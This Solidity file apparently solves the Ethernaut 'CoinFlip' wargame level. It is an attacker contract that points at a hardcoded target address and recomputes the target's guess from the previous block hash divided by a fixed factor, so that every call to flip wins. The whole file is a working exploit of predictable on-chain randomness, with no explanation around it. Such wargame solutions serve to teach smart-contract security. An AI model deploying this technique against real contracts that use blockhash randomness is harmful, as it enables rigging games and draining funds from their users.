// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../SafeMath.sol";

contract CoinFlip {
    uint256 public consecutiveWins;
    function flip(bool _guess) public returns (bool) {}
}

contract CoinFlipSol {

    using SafeMath for uint256;

    address _addr = 0x54e36CE936dB15B00bD41aA95a6Ddf8D8BBe1c55;
    CoinFlip contr = CoinFlip(_addr);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function getCurrBlockNum() external view returns (uint){
        return block.number;
    }

    function getWinCount() external view returns (uint256){
        return contr.consecutiveWins();
    }

    function flipCoin() external {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool guess = coinFlip == 1 ? true : false;

        contr.flip(guess);
    }
}